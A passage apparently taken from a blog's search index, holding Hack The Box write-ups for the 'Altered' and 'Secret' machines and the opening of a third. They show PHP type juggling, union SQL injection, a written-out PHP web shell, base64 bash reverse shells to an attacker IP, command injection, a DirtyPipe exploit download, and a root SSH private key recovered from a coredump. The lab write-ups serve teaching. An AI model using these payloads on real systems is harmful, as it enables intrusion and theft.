predictable, maybe it has some salt:\n$ echo -n 6 | md5sum 1679091c5a880faf6fb5e6087eb1b2dc -  Type Juggling exploitation We can recall that the server uses PHP (Laravel), and maybe it is vulnerable to Type Juggling. This happens if the server uses == instead of ===:\n$ php -a Interactive shell php \u0026gt; if (\"asdf\" == true) { echo \"true\"; } else { echo \"false\"; } true php \u0026gt; if (\"asdf\" === true) { echo \"true\"; } else { echo \"false\"; } false  If we enter a true (boolean value) as secret, the check will pass. In order to tell PHP that it is a boolean, we must send the data in JSON format:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":6,\"secret\":true}' -X GET -H 'Content-Type: application/json' Watchdog is an enthusiast hacker and developer from England.  SQLi exploitation It is vulnerable, now we can modify the id parameter without being caught. Let\u0026rsquo;s try SQLi:\n$ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"'\\\",\\\"secret\\\":true}\" -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error  We sent a single quote (') and the server returned 500 Internal Server Error. It is very likely that the id parameter is injectable. Let\u0026rsquo;s continue:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"6 or 1=1-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn't much footage for others to study. The only thing players can gather about this guy is what is on his \u0026lt;a href=\"bigous.me \"\u0026gt;blog\u0026lt;/a\u0026gt; and that he can hack.  Now we get a result (using comments to skip the rest of the server\u0026rsquo;s query). Let\u0026rsquo;s try with UNION SELECT:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,3-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 200 OK $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,3-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 3  Nice, we have a Union-Based SQLi, and the reflecting column is the third one. Let\u0026rsquo;s enumerate a bit:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,database()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' uhc $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,version()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 8.0.28-0ubuntu0.20.04.3 $ curl10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,user()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' uhc@localhost  We can also read files from the server (LOAD_FILE). For example:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/etc/passwd\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/home/htb/user.txt\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 96a7412e20c1c071a2cef9adbf2083aa  There is user.txt.\nGetting RCE But let\u0026rsquo;s get access to the machine using INTO OUTFILE. For that, we need to find a directory from the web server. This is the configuration for nginx:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/etc/nginx/sites-enabled/default\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' server { listen 80 default_server; listen [::]:80 default_server; root /srv/altered/public; add_header X-Frame-Options \"SAMEORIGIN\"; add_header X-Content-Type-Options \"nosniff\"; set $realip $remote_addr; if ($http_x_forwarded_for ~ \"^(\\d+\\.\\d+\\.\\d+\\.\\d+)\") { set $realip $1; } index index.php; charset utf-8; location / { try_files $uri $uri/ /index.php?$query_string; } location = /favicon.ico { access_log off; log_not_found off; } location = /robots.txt { access_log off; log_not_found off; } error_page 404 /index.php; location ~ \\.php$ { fastcgi_pass unix:/run/php/php-fpm.sock; fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name; include fastcgi_params; } location ~ /\\.(?!well-known).* { deny all; } }  The root directory is /srv/altered/public. We must inject some PHP code:\n$ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"0 union select 1,2,'\u0026lt;?php system(\\\\\\\"whoami\\\\\\\"); ?\u0026gt;' into outfile \\\\\\\"/srv/altered/public/r.php\\\\\\\"-- -\\\",\\\"secret\\\":true}\" -X GET -H 'Content-Type: application/json' \u0026/dev/null $ curl 10.10.11.159/r.php 1 2 www-data  Cool, let\u0026rsquo;s gain a reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"0 union select 1,2,'\u0026lt;?php system(\\\\\\\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\\\\\\\"); ?\u0026gt;' into outfile \\\\\\\"/srv/altered/public/rr.php\\\\\\\"-- -\\\",\\\"secret\\\":true}\" -X GET -H 'Content-Type: application/json' \u0026/dev/null $ curl 10.10.11.159/rr.php  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.159. Ncat: Connection from 10.10.11.159:52116. bash: cannot set terminal process group (928): Inappropriate ioctl for device bash: no job control in this shell www-data@altered:/srv/altered/public$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@altered:/srv/altered/public$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@altered:/srv/altered/public$ export TERM=xterm www-data@altered:/srv/altered/public$ export SHELL=bash www-data@altered:/srv/altered/public$ stty rows 50 columns 158  Privilege escalation We can enumerate the Linux kernel version:\nwww-data@altered:/home/htb$ uname -a Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux  There is a kernel vulnerability called DirtyPipe (CVE-2022-0847) that affects this kernel version. We can download the C exploit from CVE-2022-0847-DirtyPipe-Exploits and compile it in our machine. Then we can just upload the binary using a Python web server and run it:\nwww-data@altered:/tmp$ curl 10.10.17.44/exploit-1 -so dp www-data@altered:/tmp$ chmod +x dp www-data@altered:/tmp$ ./dp Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"piped\"... --- Welcome to PAM-Wordle! ---  Wait, what? Wordle? Really? Ok\u0026hellip; let\u0026rsquo;s have fun:\nwww-data@altered:/tmp$ ./dp Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"piped\"... --- Welcome to PAM-Wordle! --- A five character [a-z] word has been selected. You have 6 attempts to guess the word. After each guess you will recieve a hint which indicates: ? - what letters are wrong. * - what letters are in the wrong spot. [a-z] - what letters are correct. --- Attempt 1 of 6 --- Word: Invalid guess: unknown word. Word: shell Hint-\u0026gt;?h??? --- Attempt 2 of 6 --- Word: hacks Hint-\u0026gt;*?*?? --- Attempt 3 of 6 --- Word: chmod Hint-\u0026gt;ch?*? --- Attempt 4 of 6 --- Word: chown Correct! Password: piped Restoring /etc/passwd from /tmp/passwd.bak... Done! Popping shell... (run commands now) whoami root cat /root/root.txt 0d52a60c9470a4a1ea3a73c808072b4b  ","image":"/images/HTB/Altered/Altered.png","permalink":"https://7rocky.github.io/en/htb/altered/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine has a PHP website vulnerable to user enumeration. Then we can use brute force on a PIN to reset a password after bypassing rate limits and exploit SQLi and Type Juggling. After that, we see that the Linux kernel is vulnerable to DirtyPipe. Advanced web exploitation techniques are needed in order to compromise this machine. This write-up uses a custom Ruby script to find the valid PIN","time":8,"title":"Altered"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.120   Release: 30 / 10 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.120 -p 22,80,3000 Nmap scan report for 10.10.11.120 Host is up (0.063s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.70 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 3000 (HTTP) open.\nWeb enumeration On port 80 we have the documentation of an API. The same applies for port 3000:\nReading the documentation, we see that they are using Express JS and MongoDB in Node.js. Moreover, they handle authentication and authorization using JSON Web Token (JWT):\nThey provide three main endpoints: /api/user/register, /api/user/login and /api/priv. Some requests exmaples are shown in the following images:\nIt seems clear that the attack vector is something about JWT. We can try to use the password shown in one of the examples to login as dasith, but it does not work.\nStatic code analysis On the main page, we can download a ZIP file with the source code of the API:\nThis ZIP file contains the following source files:\n$ cd local-web $ tree -I 'node_modules|public' . ├── index.js ├── model │ └── user.js ├── package-lock.json ├── package.json ├── routes │ ├── auth.js │ ├── forgot.js │ ├── private.js │ └── verifytoken.js ├── src │ ├── routes │ │ └── web.js │ └── views │ ├── 404.ejs │ ├── doc.ejs │ └── home.ejs └── validations.js 5 directories, 13 files  Then we can start analyzing the code. It seems that there is yet another endpoint, but only for user theadmin:\nrouter.get('/logs', verifytoken, (req, res) =\u0026gt; { const file = req.query.file const userinfo = { name: req.user } const name = userinfo.name.name if (name === 'theadmin') { const getLogs = `git log --oneline ${file}` exec(getLogs, (err, output) =\u0026gt; { if (err) { return res.status(500).send(err) } res.json(output) }) } else { res.json({ role: { role: 'you are normal user', desc: userinfo.name.name } }) } })  Here we see that the file query parameter is vulnerable to command injection, since it is inserted in a system comand with no validation. This will be the way to access the machine, but we need a valid JWT token for theadmin user.\nOn the other hand, there is a really robust validation on the three endpoints mentioned before:\n// register validation const registerValidation = data =\u0026gt; { const schema = { name: Joi.string().min(6).required(), email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() } return Joi.validate(data, schema) } // login validation const loginValidation = data =\u0026gt; { const schema2 = { email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() } return Joi.validate(data, schema2) }  Then, we cannot exploit a NoSQL injection, because all parameters are correctly validated. Furthermore, the implementation of JWT is correct.\nOn the project we see a .env file with the following information:\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret  The variable TOKEN_SECRET is used to sign the JWT tokens. We can try it on the website, but it is invalid.\nWe can try to make a brute force attack on the token secret using rockyou.txt in Node.js. Curiously, using the JWT token shown in the API documentation, the secret is example:\n$ node \u0026gt; const fs = require('fs') undefined \u0026gt; const jwt = require('jsonwebtoken') undefined \u0026gt; for (const password of fs.readFileSync('rockyou.txt').toString().split('\\n')) { try { jwt.verify('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg', password); console.log(password); break } catch (err) { } } example undefined  But secret example does not work on the website. If we try to make a brute force attack on a JWT token of the website after registering a new account, we cannot obtain any valid secret (which means that the secret is not included in rockyou.txt).\nGit project enumeration On the ZIP file, there is also a .git folder. This is because the project is controlled by a Git repository. Then, we can try to see if there is sensitive information on previous commits. For example, let\u0026rsquo;s see the Git history:\n$ git log commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -\u0026gt; master) Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons commit de0a46b5107a2f4d26e348303e76d85ae4870934 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:29:19 2021 +0530 added /downloads commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:27:35 2021 +0530 removed swap commit 3a367e735ee76569664bf7754eaaade7c735d702 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:26:39 2021 +0530 added downloads commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:25:52 2021 +0530 first commit  We see that the TOKEN_SECRET was changed in the .env file in the commit that starts with 67d8da7a. Then we can see the differences from the previous commit (the one that starts with de0a46b5) to the current version:\n$ git diff -p de0a46b5 | grep TOKEN_SECRET -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret  Now we have a large secret that might be the one used in the API. Let\u0026rsquo;s create a JWT token using this secret then:\n\u0026gt; jwt.sign({ _id: '1337', name: 'theadmin', email: 'root@dasith.works' }, 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE') 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'  Foothold on the machine Now we are able to perform a command injection and connect to the machine. For that, we can use a common Bash reverse shell payload encoded in Base64 to prevent character issues:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Now we can perform the command injection by putting a semicolon and then the command (notice that + is a space in URL encoding):\n$ curl '10.10.11.120/api/logs?file=;+echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'  And we get access as user dasith from the nc listener:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.120. Ncat: Connection from 10.10.11.120:34952. bash: cannot set terminal process group (1118): Inappropriate ioctl for device bash: no job control in this shell dasith@secret:~/local-web$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null dasith@secret:~/local-web$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm dasith@secret:~/local-web$ export SHELL=bash dasith@secret:~/local-web$ export TERM=xterm dasith@secret:~/local-web$ stty rows 50 columns 158  At this point, we can read the user.txt flag:\ndasith@secret:~/local-web$ cd dasith@secret:~$ cat user.txt 257020bf6c2e57197510fcb6b5f4726c  Finding a SUID binary After enumerating the system, we find an SUID binary in /opt/count:\ndasith@secret:~$ find / -perm -4000 2\u0026gt;/dev/null | grep -v snap /usr/bin/pkexec /usr/bin/sudo /usr/bin/fusermount /usr/bin/umount /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /opt/count  This is an ELF binary:\ndasith@secret:~$ file /opt/count /opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped  Executing the binary let\u0026rsquo;s us read files as root user, but the content is not shown, we can see some stats of these files (number of lines, words and letters). We are also able to list the content of some directories as root user. Then we can output the results to a file, but as dasith user (privileges are dropped).\nFortunately, we have the source code available in /opt/code.c:\ndasith@secret:~$ ls /opt code.c count valgrind.log  It does not seem to be vulnerable to Buffer Overflow, Format String or Library Hijacking. But there is something strange in these lines:\n// drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1);  This fragment of code is executed right before writing the results to a file. This is a misconfiguration, since we can crash the program an read the contents of the coredump as dasith user (which will contain the contents of the previously read file as root).\nPrivilege escalation Using the binary, we can see that root contains an id_rsa private key for SSH:\ndasith@secret:~$ /opt/count Enter source file/directory name: /root -rw-r--r-- .viminfo drwxr-xr-x .. -rw-r--r-- .bashrc drwxr-xr-x .local drwxr-xr-x snap lrwxrwxrwx .bash_history drwx------ .config drwxr-xr-x .pm2 -rw-r--r-- .profile drwxr-xr-x .vim drwx------ . drwx------ .cache -r-------- root.txt drwxr-xr-x .npm drwx------ .ssh Total entries = 15 Regular files = 4 Directories = 10 Symbolic links = 1 Save results a file? [y/N]: dasith@secret:~$ /opt/count Enter source file/directory name: /root/.ssh drwx------ .. -rw------- authorized_keys -rw------- id_rsa drwx------ . -rw-r--r-- id_rsa.pub Total entries = 5 Regular files = 3 Directories = 2 Symbolic links = 0 Save results a file? [y/N]:  Then we can read this file and then crash the program. To crash it, we can use Control-Z (^Z) and then kill -SIGSEGV indicating the process identifier (PID), listed with ps -a. Then we put the program in foreground and see the message \u0026ldquo;Segmentation fault (core dumped)\u0026rdquo;:\ndasith@secret:~$ /opt/count Enter source file/directory name: /root/.ssh/id_rsa Total characters = 2602 Total words = 45 Total lines = 39 Save results a file? [y/N]: y Path: ^Z [1]+ Stopped /opt/count dasith@secret:~$ ps -a | grep count 47330 pts/6 00:00:00 count dasith@secret:~$ kill -SIGSEGV 47330 dasith@secret:~$ fg /opt/count Segmentation fault (core dumped)  This error generates a crash file in /var/crash. Using apport-unpack we can extract the CoreDump file and read the contents of /root/.ssh/id_rsa (because it is the file we read with /opt/count):\ndasith@secret:~$ ls /var/crash _opt_count.1000.crash dasith@secret:~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/.crash dasith@secret:~$ ls /tmp/.crash Architecture Date ExecutablePath ProblemType ProcCwd ProcMaps Signal UserGroups CoreDump DistroRelease ExecutableTimestamp ProcCmdline ProcEnviron ProcStatus Uname dasith@secret:~$ strings -n 32 /tmp/.crash/CoreDump /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so Please check if file exists and you have read privilege. Enter source file/directory name: Path: esults a file? [y/N]: l words = 45 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3 KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+ 7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1 xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx 8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2 5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2 EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr 85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65 rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob 0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde +GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3 t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997 44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3 4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81 ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4 Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9 RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9 6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA== -----END OPENSSH PRIVATE KEY----- DB_CONNECT=mongodb://127.0.0.1:27017/auth-web unique_id=4594a417-fb89-4a4a-8936-6a56a15fce32 LESSCLOSE=/usr/bin/lesspipe %s %s TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE pm_pid_path=/home/dasith/.pm2/pids/index-0.pid pm_err_log_path=/home/dasith/.pm2/logs/index-error.log pm_exec_path=/home/dasith/local-web/index.js pm_out_log_path=/home/dasith/.pm2/logs/index-out.log GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0  Finally, we can put the key into a file in our machine and connect to the remote machine as root. Then we can get the root.txt flag:\n$ chmod 600 id_rsa $ ssh -i id_rsa root@10.10.11.120 root@secret:~# cat /root/root.txt 90fd01f9faa29c802ad279f48224edc8  ","image":"/images/HTB/Secret/Secret.png","permalink":"https://7rocky.github.io/en/htb/secret/","section":"htb","summary":"Hack The Box. Linux. Easy Machine. This machine contains an API that uses JWT tokens for authentication. We can download the proyect and discover that it is a Git repository, so that we can see the secret key in previous commits and exploit a command injection vulnerability. There is a SUID binary that reads files as root although it only shows some statistics of the file, but we are able to kill the process and read the coredump. Web exploitation techniques, Git enumeration and knowledge about Linux processes are needed in order to compromise this machine","time":9,"title":"Secret"},{"contents":"  OS: Linux   Difficulty: Insane   IP Address: 10.10.11.112   Release: 18 / 09 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.112 -p 22,80,2376 Nmap scan report for 10.10.11.112 Host is up (0.051s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 